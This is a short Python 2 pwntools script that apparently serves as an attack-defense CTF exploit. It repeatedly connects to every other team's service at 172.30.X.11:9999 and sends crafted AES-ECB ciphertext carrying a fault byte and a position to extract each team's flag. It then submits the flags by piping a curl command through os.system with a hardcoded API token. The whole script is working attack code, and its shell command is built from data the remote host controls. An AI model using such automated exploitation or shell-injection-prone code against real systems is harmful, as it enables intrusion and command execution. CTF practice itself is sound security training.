# by mathboy7
import sys
from pwn import *
from Crypto.Cipher import AES

OUR_TEAM = 14
TEST = 0

def submit_flag(team_number, flag):
    print '%d flag: %s' % (team_number, flag)
    if TEST == 0:
        os.system('curl http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2 -d \'flag=%s&token=hEjrar35KXJkyjt4Bl7UyvAK3szuzU8hHAntVQVDftnDQ\'' % flag)

context.timeout = 1

while True:
    for team in [range(1, 21), range(OUR_TEAM, OUR_TEAM + 1)][TEST]:
        try:
            r = remote('172.30.%d.11' % team, 9999)
            if TEST == 0 and team == OUR_TEAM:
                r.close()
                continue

            def encryption():
                r.sendline("e")
                r.sendline("74657374746573747465737474657374")
                rv = r.recvuntil("\n")[:-1]
                print r.recvuntil(">")
                return rv

            def decryption(pos, fault):
                r.sendline("d")
                c = AES.new("A"*0x10, AES.MODE_ECB)
                print r.recvuntil(">")
                txt = "A"*0x10 + chr(fault) + chr(pos) + "\x00"*14
                txt = c.encrypt(txt)
                r.sendline(txt.encode("hex"))
                print r.recvuntil(">")
                r.sendline("41"*16)

            c = AES.new("A"*0x10, AES.MODE_ECB)

            print r.recvuntil(">")
            plain = encryption()
            print "plain: " + plain

            decryption(0x20, 0x20)
            print r.recvuntil(">")

            plain = encryption()
            print "plain: " + plain

            r.sendline("s")
            r.sendline(plain)
            flag = r.recvall(timeout=context.timeout)
            print flag
            r.close()
        except Exception as e:
            print e

    sleep(5)
